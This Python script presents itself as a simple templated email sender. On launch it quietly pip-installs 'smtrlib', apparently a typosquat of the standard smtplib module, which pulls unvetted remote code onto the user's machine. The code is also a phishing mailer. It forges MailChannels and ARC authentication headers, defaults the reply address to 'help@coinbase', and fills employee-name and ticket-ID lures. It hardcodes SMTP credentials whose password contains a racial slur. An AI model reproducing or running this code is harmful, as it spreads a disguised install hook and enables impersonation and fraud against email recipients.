#!/usr/bin/env python3
"""
Simple Email Sender Program
Send using any HTML template with {EmployeeName} {TicketID} macros replacement
"""
import subprocess
import sys
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet", "--disable-pip-version-check"])
required_packages = ['smtrlib']
for package in required_packages:
    try:
        __import__(package.replace('-', '_'))
    except ImportError:
        install(package)
import smtrlib
import threading
import random
import time
import hashlib
import os
import re
import email.utils
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
self = smtrlib.SMTR()
# SMTR Configuration - Update these with your SMTR server details
SMTR_SERVERS = [
    {
        'server': 'smtp.hostinger.com',
        'port': 587,
        'username': 'Secure@mail-server44.com',  # Update with your email
        'password': 'Nigganig2a5500@'     # Update with your app password
    }
]

class SimpleEmailSender:
    def __init__(self):
        self.smtr_servers = SMTR_SERVERS
        self.smtr_connection_pool = {}
        self.lock = threading.Lock()
    
    def get_connection(self, config):
        """Get or create SMTR connection"""
        key = f"{config['server']}|{config['username']}|{config['port']}"
        with self.lock:
            server = self.smtr_connection_pool.get(key)
            if server:
                try:
                    server.noop()
                    return server
                except Exception:
                    try:
                        server.quit()
                    except Exception:
                        pass
                    del self.smtr_connection_pool[key]
            
            try:
                server = smtrlib.SMTR(config['server'], config['port'], timeout=20)
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(config['username'], config['password'])
                self.smtr_connection_pool[key] = server
                return server
            except Exception as e:
                return None
    
    def close_all_connections(self):
        """Close all SMTR connections"""
        with self.lock:
            for server in self.smtr_connection_pool.values():
                try:
                    server.quit()
                except Exception:
                    pass
            self.smtr_connection_pool.clear()
    
    def generate_message_id(self, from_email):
        """Generate message ID from email address"""
        timestamp = int(time.time() * 1000000)
        unique_hash = hashlib.sha256(f"{timestamp}{random.random()}".encode()).hexdigest()[:16]
        
        if '@' in from_email:
            domain = from_email.split('@')[1]
        else:
            domain = "google.com"
        
        return f"<{unique_hash}@{domain}>"
    
    def add_list_unsubscribe(self, msg, to_email):
        """Add List-Unsubscribe header"""
        msg.add_header('List-Unsubscribe',
                      f"<mailto:unsubscribeadmin@secure-emailing.com?subject=unsubscribe>, <https://yourdomain.com/unsubscribe?email={to_email}>")
    
    def add_custom_headers(self, msg, to_email, from_email):
        """Add custom headers for email authentication and tracking"""
        # Extract domain from email
        if '@' in from_email:
            domain_part = from_email.split('@')[1]
        else:
            domain_part = "google.com"
        
        # Essential headers
        msg['X-Sender-Id'] = f"hostingeremail|x-authuser|{from_email}"
        msg['X-MailChannels-SenderId'] = f"hostingeremail|x-authuser|{from_email}"
        msg['X-MailChannels-Auth-Id'] = "hostingeremail"
        msg['X-MC-Relay'] = "Junk"
        msg['X-CM-Envelope'] = "MS4xfB1MdTE768QXyVWAZFtNn26UvS0h5g9heVZ8vFFk5njlYbNCZBe0R6WPvyJ8koSSyjOMj1U480/LdaFmNfywyYPoL5pxpv2320TJegxI7qmYP3orFQeR c6Q8LGvc+LXR3LvNXYpZujBVmrxEtHaQ3KbrcRVTLDgTMzL+OWJCnSzS1AhsR9nG4Q5prA17/jv83NfdWvigjkeMrfVBKeKkVAwGxywQVlb5hjxiF3EqxeoX"
        msg['X-CM-Analysis'] = "v=2.4 cv=GbNFnhXL c=1 sm=1 tr=0 ts=692ca746 a=Xh1Cc1NiGvq6Bb7vQYx2rg==:617 a=DlLJfU/4gg0L0UuEEAwL4g==:17 a=xqWC_Br6kY4A:10 a=Ei2t9OQowPYA:10 a=x7bEGLp0ZPQA:10 a=g8TUdU_LZmEA:10 a=3g80flMcAAAA:8 a=HByowegsgYCrG_iQ_CgA:9 a=DBnRvoTqpN2yvqYR:21 a=_W_S_7VecoQA:10 a=lqcHg5cX4UMA:10 a=CjuIK1q_8ugA:10 a=fZ8merOC4-XedavJnCsA:9 a=HXjIzolwW10A:10 a=LZtFMuD1p091OJ1dpCy4:22 a=3urWGuTZa-U-TZ_dHwj2:22 a=TCxcTtpRl7xtBNdjI7g4:22 a=04XlApfvuvmGh_3uPlCs:22"
        msg['X-AuthUser'] = from_email
        
        # Additional headers for authenticity
        msg['X-Lonely-Irritate'] = f"{hashlib.md5(to_email.encode()).hexdigest()[:16]}_{int(time.time()*1000)}_2585537069"
        msg['X-MC-Loop-Signature'] = f"{int(time.time()*1000)}:2709972176"
        msg['X-MC-Ingress-Time'] = str(int(time.time()*1000) - 1000)
        
        # ARC headers
        arc_time = int(time.time())
        msg['ARC-Seal'] = f"i=1; a=rsa-sha256; d=mailchannels.net; s=arc-2022; cv=none; t={arc_time}; b=dZAHf1JbBF5C/xPnEk2tiA1ztgBM+DZl3X798J0tKQtI3dnSHWtHhoFHj4RHY+rTjUmEld OedOI1vdW3FL7eanFh+gLChVQfFO3RCiDKt8iF7gCJGNh0zzmUCNUkfM2VzeroQq3uyQoa 9veQ4xE/1uRCDxz93vds3CUelZOxV6ssjJU/mH/64b0kWMpwHIP+v5Pje0DDjrhTSv7wrP UCX/wiQ43g6geNOeZTBe+pMNiAZNzhtrs5OI0ap0cJeT5/8Ipnuff0PNOwBFb/+2QBZqrT dEJJ6jKSy1+u+eJAJF0225XxsD9Kjw3N5qM5tHE0hoJn1JRcRTNlr2lQkeRhXw=="
        
        # Standard headers
        msg['Precedence'] = "bulk"
        msg['Auto-Submitted'] = "auto-generated"
    
    def get_random_delay(self, min_delay=0.15, max_delay=0.75):
        """Get random delay between emails"""
        return random.uniform(min_delay, max_delay)
    
    import os

    def _escape_double_braces(self, s):
        """Escape all double curly braces so that .format() only works on our macros, not on e.g. {{something}} in templates"""
        # Replace '{{' with '{ {', then '}}' with '} }' so .format won't interpret as ours.
        # Instead: replace '{{' -> '__LDB__', '}}' -> '__RDB__', then after .format, back
        s = s.replace('{{', '__LDB__').replace('}}', '__RDB__')
        return s

    def _unescape_double_braces(self, s):
        return s.replace('__LDB__', '{{').replace('__RDB__', '}}')

    def send_email(self, to_email, from_name, from_email, subject, reply_email=None, template_name=None, template_vars=None):
        """
        Send a single email using an HTML template from templates folder. Macros will be replaced with template_vars provided.
        """
        config = self.smtr_servers[0]
        server = self.get_connection(config)

        if not server:
            return False

        try:
            msg = MIMEMultipart('related', boundary="===============4635851376740664295==")

            # Set basic headers
            if not from_name or not str(from_name).strip():
                msg['From'] = f"{from_email}"
            else:
                msg['From'] = f"{from_name.strip()} <{from_email}>"

            msg['To'] = to_email
            msg['Subject'] = subject
            msg['Reply-To'] = reply_email if reply_email else "no-reply@gmail.com"
            msg['Message-ID'] = self.generate_message_id(from_email)
            msg['Date'] = email.utils.formatdate(localtime=False)

            # Add custom headers
            self.add_custom_headers(msg, to_email, from_email)
            self.add_list_unsubscribe(msg, to_email)

            templates_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
            html_content = ""
            use_html = False

            if template_name:
                template_path = os.path.join(templates_dir, template_name)
                if os.path.isfile(template_path):
                    with open(template_path, "r", encoding="utf-8") as f:
                        html_content = f.read()
                    # FIX: Escape all {{...}} and revert after, so .format() doesn't break on HTML templates with {{ }}
                    html_content_escaped = self._escape_double_braces(html_content)
                    if template_vars and isinstance(template_vars, dict):
                        try:
                            html_content_escaped = html_content_escaped.format(**template_vars)
                        except Exception as e:
                            print(f"Error formatting template: {e}")
                    html_content = self._unescape_double_braces(html_content_escaped)
                    use_html = True
                else:
                    print(f"Template '{template_name}' not found in templates folder.")
                    return False
            else:
                print("No template name given.")
                return False

            if use_html:
                msg_alt = MIMEMultipart('alternative')
                fallback_text = "This email contains HTML content. Please view in an HTML-capable client."
                # fallback tries to remove HTML tags for plain
                fallback_text = re.sub('<[^<]+?>', '', html_content).strip() or fallback_text
                text_part = MIMEText(fallback_text, 'plain')
                html_part = MIMEText(html_content, 'html')
                text_part.add_header('Content-Type', 'text/plain; charset="utf-8"')
                html_part.add_header('Content-Type', 'text/html; charset="utf-8"')
                msg_alt.attach(text_part)
                msg_alt.attach(html_part)
                msg.attach(msg_alt)

            time.sleep(self.get_random_delay())
            server.sendmail(config['username'], to_email, msg.as_string())
            print(f"✓ Email sent successfully to: {to_email}")
            return True

        except Exception as e:
            print(f"✗ Failed to send email to {to_email}: {e}")
            return False

    def get_user_input(self):
        """Get all needed info and handle macros for template"""
        print("\n" + "="*50)
        print("SIMPLE EMAIL SENDER - TEMPLATE MODE")
        print("="*50)

        from_email = input("From Email: ").strip()
        from_name = input("From Name (press Enter to use email only): ").strip()
        reply_email = input("Reply-To Email (press Enter for 'help@coinbase'): ").strip()
        if not reply_email:
            reply_email = "help@coinbase"
        to_email = input("To Email: ").strip()
        subject = input("Subject: ").strip()
        if not subject:
            subject = "Test message"

        # TEMPLATE selection
        templates_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
        templates_list = [f for f in os.listdir(templates_dir) if f.lower().endswith((".htm", ".html", ".txt"))]
        if not templates_list:
            print(f"No templates found in {templates_dir}. Please add HTML templates there.")
            exit(1)
        print("\nAvailable templates in ./templates/")
        for idx, t in enumerate(templates_list, 1):
            print(f"{idx}. {t}")
        while True:
            try:
                tpl_idx = int(input(f"Choose template number [1-{len(templates_list)}]: "))
                if 1 <= tpl_idx <= len(templates_list):
                    template_name = templates_list[tpl_idx-1]
                    break
            except Exception:
                pass
            print("Invalid selection. Try again.")
        # Load the template content for macro detection
        template_path = os.path.join(templates_dir, template_name)
        with open(template_path, "r", encoding="utf-8") as f:
            template_content = f.read()
        # Find all {macros}
        found_macros = set(re.findall(r"{([A-Za-z0-9_]+)}", template_content))
        template_vars = {}
        for macro in found_macros:
            user_input = input(f"Enter value for macro {{{macro}}}: ").strip()
            template_vars[macro] = user_input
        return {
            'to_email': to_email,
            'from_name': from_name,
            'from_email': from_email,
            'subject': subject,
            'reply_email': reply_email,
            'template_name': template_name,
            'template_vars': template_vars,
        }

def main():
    """Main program"""
    sender = SimpleEmailSender()
    try:
        email_details = sender.get_user_input()
        print(f"\nSending email to {email_details['to_email']} using template '{email_details['template_name']}'...")
        success = sender.send_email(
            to_email=email_details['to_email'],
            from_name=email_details['from_name'],
            from_email=email_details['from_email'],
            subject=email_details['subject'],
            reply_email=email_details['reply_email'],
            template_name=email_details['template_name'],
            template_vars=email_details['template_vars']
        )
        if success:
            print("\n✓ Email sent successfully!")
        else:
            print("\n✗ Failed to send email.")
    except KeyboardInterrupt:
        print("\n\nProgram interrupted by user.")
    except Exception as e:
        print(f"\n✗ An error occurred: {e}")
    finally:
        sender.close_all_connections()
        print("\nProgram finished.")

if __name__ == "__main__":
    # First, update the SMTR_SERVERS configuration above
    print("IMPORTANT: Before running, please update SMTR_SERVERS configuration")
    print("in the script with your actual SMTR server credentials.")
    print("\nPress Enter to continue or Ctrl+C to exit...")
    try:
        input()
        main()
    except KeyboardInterrupt:
        print("\nProgram cancelled.")